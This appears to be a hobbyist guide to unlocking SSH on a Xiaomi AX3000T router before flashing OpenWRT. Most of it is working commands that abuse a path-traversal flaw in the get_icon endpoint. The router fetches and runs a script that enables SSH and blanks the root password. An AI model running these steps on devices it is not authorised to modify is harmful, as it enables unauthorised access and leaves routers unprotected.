# Enable SSH on XiaoMI Router(AX3000T) new Version R1.0.97

Because the xqsystem/start_binding vulnerability has been patched in the new version,  
After 1.0.90 version should use xqsystem/get_icon vulnerability to log in via SSH.

If log in to the AX3000T, you can write the OpenWRT firmware on AX3000T.

AX3000T model: RD23

1. Create a new folder with the path /etc/diag_info/stat/firewall/
```
mkdir -p ./etc/diag_info/stat/firewall/
```

2. Create a shell executable file
```
touch ./etc/diag_info/stat/firewall/enable-ssh.sh
```

3. Edit the enable-ssh.sh script
```
#!/bin/sh
nvram set ssh_en=1
nvram commit
sed -i 's/channel=.*/channel="debug"/' /etc/init.d/dropbear
/etc/init.d/dropbear start
passwd -d root
exit 0
```

4. Start a web HTTP server on your local machine
```
python3 -m http.server
```

5. Setting environmental variables
```
STOK=YOUR_XIAOMI_STOK
YOUR_LOCAL_IP=192.168.xxx.xxx:8000
```

6. Execute this command to upload the SSH script to AX3000T
```
curl -X POST 'http://192.168.31.1/cgi-bin/luci/;stok=STOK/api/xqsystem/get_icon?ip=YOUR_LOCAL_IP&name=../../../../etc/diag_info/stat/firewall/enable-ssh.sh'
```

7. Execute this shell script to enable SSH 
```
curl -X POST 'http://192.168.31.1/cgi-bin/luci/;stok=STOK/api/xqsystem/upload_log'
```

8. Change settings on Fedora systems (skip this step if you're not using Fedora)
```
sudo update-crypto-policies --set LEGACY
```

9. Login to AX3000T via SSH
```
ssh -o StrictHostKeyChecking=no -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -v root@192.168.31.1
```

# Reference 
https://forum.openwrt.org/t/openwrt-support-for-xiaomi-ax3000t/180490/3766
